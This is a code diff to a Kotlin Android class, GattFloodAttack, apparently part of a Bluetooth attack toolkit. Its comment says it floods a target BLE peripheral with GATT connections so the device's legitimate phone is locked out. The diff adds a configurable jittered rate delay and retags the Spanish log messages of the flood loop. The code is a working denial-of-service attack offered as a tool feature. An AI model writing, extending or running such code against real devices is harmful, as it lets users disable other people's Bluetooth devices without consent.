@@ -21,7 +21,11 @@ import java.util.concurrent.CopyOnWriteArrayList
  * connection table fills up and the legitimate phone gets locked out.
  * Most BLE peripherals accept only a handful of concurrent connections.
  */
-class GattFloodAttack(private val targetAddress: String, private val threads: Int = 8) : BluetoothAttack {
+class GattFloodAttack(
+    private val targetAddress: String,
+    private val threads: Int = 8,
+    private val rateDelayMs: Int = 0
+) : BluetoothAttack {
 
     override val displayName = AttackType.GATT_FLOOD.displayName
     override val description = AttackType.GATT_FLOOD.description
@@ -54,8 +58,8 @@ class GattFloodAttack(private val targetAddress: String, private val threads: In
         scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
         scope!!.launch {
             var totalOpened = 0
-            onLog("GATT Flood iniciado (objetivo $targetAddress)")
-            onLog("Máx conexiones paralelas: $maxConcurrent")
+            onLog("[GATT] Flood iniciado (objetivo $targetAddress)")
+            onLog("[GATT] Máx conexiones paralelas: $maxConcurrent")
             while (isActive && running) {
                 while (running && gattConnections.size < maxConcurrent) {
                     val gatt = try {
@@ -71,13 +75,13 @@ class GattFloodAttack(private val targetAddress: String, private val threads: In
                     if (gatt != null) {
                         gattConnections.add(gatt)
                         totalOpened++
-                        if (totalOpened % 20 == 0) onLog("Conexiones abiertas hasta ahora: $totalOpened")
+                        if (totalOpened % 20 == 0) onLog("[CONN] Conexiones abiertas hasta ahora: $totalOpened")
                     }
                     delay(50)
                 }
-                delay(400)
+                if (rateDelayMs > 0) jitterDelay(rateDelayMs) else delay(400)
             }
-            onLog("GATT Flood detenido ($totalOpened conexiones abiertas en total)")
+            onLog("[GATT] Flood detenido ($totalOpened conexiones abiertas en total)")
         }
     }
 
